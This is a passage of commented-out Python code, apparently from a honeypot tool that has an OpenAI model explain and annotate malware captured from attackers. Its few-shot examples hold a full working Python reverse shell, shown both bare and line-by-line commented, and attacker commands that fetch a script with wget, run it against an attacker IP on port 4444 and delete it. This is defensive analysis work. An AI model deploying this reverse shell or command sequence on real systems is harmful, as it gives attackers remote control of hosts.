#     # Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
#     os.dup2(s.fileno(),0)
#     os.dup2(s.fileno(),1)
#     os.dup2(s.fileno(),2)
    
#     # Spawn a shell on the remote system.
#     pty.spawn(args.shell)
# """

#         commented_malware_lines1 = commented_malware1.split("\n")
#         comment_indexes1 = {commented_malware1.index(line): line for line in commented_malware_lines1 if line.strip().startswith("#")}

#         example_explanation1 = """This malware sample is a `Python` script that is used to spawn a shell on a remote system. 
# The script uses the `socket`, `os`, `argparse`, and `pty` modules.
# * The `socket` module is used to create a socket object that is used to connect to the remote system.
# * The `os` module is used to duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
# * The `argparse` module is used to parse the command line arguments.
# * The `pty` module is used to spawn a shell on the remote system.

# The script performs the following steps:
# 1. Initialize the parser object and parse the command line arguments.
# 2. Create a socket object using the specified socket family, type, protocol, and file descriptor.
# 3. Connect to the remote system using the specified IP address and port.
# 4. Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
# 5. Spawn a shell on the remote system.

# Since the script was executed with the following command: `python3 example.py -l 100.100.101.101 -p 4444 &` we know the script was run in the background and attempted to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
# We also know that the script attempted to spawn a `/bin/bash` shell on the remote system since this is the default value for the `--shell` argument. 
# """


#         example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
#         example_response1 = {"malware_comments": comment_indexes1, "malware_explanation": example_explanation1, "malware_language": "python"}

#         messages = [
#             {"role": "system", "content": system_prompt},
#             {"role": "user", "content": json.dumps(example_input1, indent=0)},
#             {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
#             {"role": "user", "content": json.dumps({"malware_source_code": malware_source_code, "commands": self.format_commands(commands)}, indent=0)}
#         ]

#         result = self.openai_get_chat(
#             model=self.model,
#             messages=messages, 
#             n=n,
#             response_format={ "type": "json_object" },
#             **kwargs)


#         result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
#         result["commented_code"] = self.insert_comments(malware_source_code, result["malware_comments"])
#         return result
    
#     def insert_comments(self, source_code, comment_indexes):
#         lines = source_code.split("\n")
#         for line_index, comment in comment_indexes.items():
#             line_index = int(line_index)
#             lines[line_index] = comment + "\n" + lines[line_index]

#         return "\n".join(lines)















#     def explain_and_comment_malware(self, malware_source_code, commands=[], n=1, retries=0, **kwargs):
#         system_prompt = " ".join([
#         "Your role is to throughly explain and comment a piece of malware that was executed by an attacker on a Linux honeypot system.",
#         "Input will be provided as a json object with two keys: malware_source_code and commands.",
#         "Input will be structured in the following format: {malware_source_code: malware_source_code_string, commands: {command_index: command_string, ...}}."
#         "malware_source_code will be a string containing the source code of the malware that you are to explain and comment.",
#         "commands are the commands that were excuted by the attacker to download and execute the malware for context when explaining the malware.",
#         "Output must be a json object with three keys: commented_code, malware_explanation, malware_language",
#         "Output must be in the following format {commented_code: malware_source_code_with_comments_explaining_steps, malware_explanation: paragraph(s) explaining the malware, malware_language: language_malware_is_written_in}."
#         #"The commented_code value should be the same as the input source code but with comments explaining each step of the malware execution.",
#         "The commented_code value must contain every line of the input source code but with comments explaining each step of the malware execution.",
#         "The malware_explanation should explain the code and comments in the commented_code value in greater detail and what the attacker was trying to do with the malware.",
#         "The malware_explanation value will be used in a GitHub .md file so you can use markdown syntax to format your output.",
#         ])

#         example_commands1 = ["wget http://example.com -O example.py", 
#                             "python3 example.py -s /bin/bash -l 100.100.101.101 -p 4444 &",
#                             "rm example.py"]

#         example_malware1 = """
# import socket
# import os
# import argparse
# import pty


# if __name__ == "__main__":
#     parser=argparse.ArgumentParser()
#     parser.add_argument('-s', '--shell',
#                         required=False,
#                         action='store',
#                         default="/bin/bash",
#                         help="The shell to spawn")
#     parser.add_argument('-l', '--host', 
#                         required=False, 
#                         action='store', 
#                         default="127.0.0.1", 
#                         help='The IP address to connect to')
#     parser.add_argument('-p', '--port',
#                         required=False,
#                         type=int, 
#                         default=6969, 
#                         help="A comma separated list of ports to try to connect to")
    
#     parser.add_argument('-f', '--family',
#                         required=False,
#                         default=socket.AF_INET,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket family to use")
#     parser.add_argument('-t', '--type',
#                         required=False,
#                         default=socket.SOCK_STREAM,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket type to use")
#     parser.add_argument('--protocol',
#                         required=False,
#                         default=-1,
#                         type=int,
#                         help="The socket protocol to use")
#     parser.add_argument('--fileno',
#                         required=False,
#                         default=None,
#                         type=int,
#                         help="The file descriptor to use")
    
#     args=parser.parse_args()

#     s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)
#     s.connect((args.host, args.port))

#     os.dup2(s.fileno(),0)
#     os.dup2(s.fileno(),1)
#     os.dup2(s.fileno(),2)
    
#     pty.spawn(args.shell)
# """

#         commented_malware1 = """

# # This script is a python script that is used to spawn a shell on a remote system.

# # Import the socket, os, argparse, and pty modules.
# import socket
# import os
# import argparse
# import pty


# if __name__ == "__main__":
#     # Initialize the parser object.
#     parser=argparse.ArgumentParser()

#     # The shell argument is used to specify the shell to spawn on the remote system.
#     parser.add_argument('-s', '--shell',
#                         required=False,
#                         action='store',
#                         default="/bin/bash",
#                         help="The shell to spawn")
    
#     # The host argument is used to specify the IP address of the remote system.
#     parser.add_argument('-l', '--host', 
#                         required=False, 
#                         action='store', 
#                         default="127.0.0.1", 
#                         help='The IP address to connect to')

#     # The port argument is used to specify the port to connect to on the remote system. 
#     parser.add_argument('-p', '--port',
#                         required=False,
#                         type=int, 
#                         default=6969, 
#                         help="A comma separated list of ports to try to connect to")
    
#     # The family argument is used to specify the socket family to use. The default is AF_INET.
#     parser.add_argument('-f', '--family',
#                         required=False,
#                         default=socket.AF_INET,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket family to use")

#     # The type argument is used to specify the socket type to use. The default is SOCK_STREAM.
#     parser.add_argument('-t', '--type',
#                         required=False,
#                         default=socket.SOCK_STREAM,
#                         type=lambda s: getattr(socket, s),
#                         help="The socket type to use")

#     # The protocol argument is used to specify the socket protocol to use. The default is -1.
#     parser.add_argument('--protocol',
#                         required=False,
#                         default=-1,
#                         type=int,
#                         help="The socket protocol to use")

#     # The fileno argument is used to specify the file descriptor to use. The default is None.
#     parser.add_argument('--fileno',
#                         required=False,
#                         default=None,
#                         type=int,
#                         help="The file descriptor to use")
    
#     # Parse the arguments.
#     args=parser.parse_args()

#     # Create a socket object using the specified socket family, type, protocol, and file descriptor.
#     s = socket.socket(family=args.family, type=args.type, proto=args.protocol, fileno=args.fileno)

#     # Connect to the remote system using the specified IP address and port.
#     s.connect((args.host, args.port))

#     # Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
#     os.dup2(s.fileno(),0)
#     os.dup2(s.fileno(),1)
#     os.dup2(s.fileno(),2)
    
#     # Spawn a shell on the remote system.
#     pty.spawn(args.shell)
# """

#         example_explanation1 = """This malware sample is a `Python` script that is used to spawn a shell on a remote system. 
# The script uses the `socket`, `os`, `argparse`, and `pty` modules.
# * The `socket` module is used to create a socket object that is used to connect to the remote system.
# * The `os` module is used to duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
# * The `argparse` module is used to parse the command line arguments.
# * The `pty` module is used to spawn a shell on the remote system.

# The script performs the following steps:
# 1. Initialize the parser object and parse the command line arguments.
# 2. Create a socket object using the specified socket family, type, protocol, and file descriptor.
# 3. Connect to the remote system using the specified IP address and port.
# 4. Duplicate the file descriptors for stdin, stdout, and stderr to the socket file descriptor.
# 5. Spawn a shell on the remote system.

# Since the script was executed with the following command: `python3 example.py -l 100.100.101.101 -p 4444 &` we know the script was run in the background and attempted to connect to the attacker system with IP address `100.100.101.101` on port `4444`.
# We also know that the script attempted to spawn a `/bin/bash` shell on the remote system since this is the default value for the `--shell` argument. 
# """


#         example_input1 = {"malware_source_code": example_malware1, "commands": self.format_commands(example_commands1)}
#         example_response1 = {"commented_code": commented_malware1, "malware_explanation": example_explanation1, "malware_language": "python"}

#         messages = [
#             {"role": "system", "content": system_prompt},
#             {"role": "user", "content": json.dumps(example_input1, indent=0)},
#             {"role": "assistant", "content": json.dumps(example_response1, indent=0)},
#             {"role": "user", "content": json.dumps({"malware_source_code": malware_source_code, "commands": self.format_commands(commands)}, indent=0)}
#         ]

#         result = self.openai_get_chat(
#             model=self.model,
#             messages=messages, 
#             n=n,
#             response_format={ "type": "json_object" },
#             **kwargs)


#         result = self.try_load_json_result(result, self.explain_commands, retries, n, commands, **kwargs)
#         return result

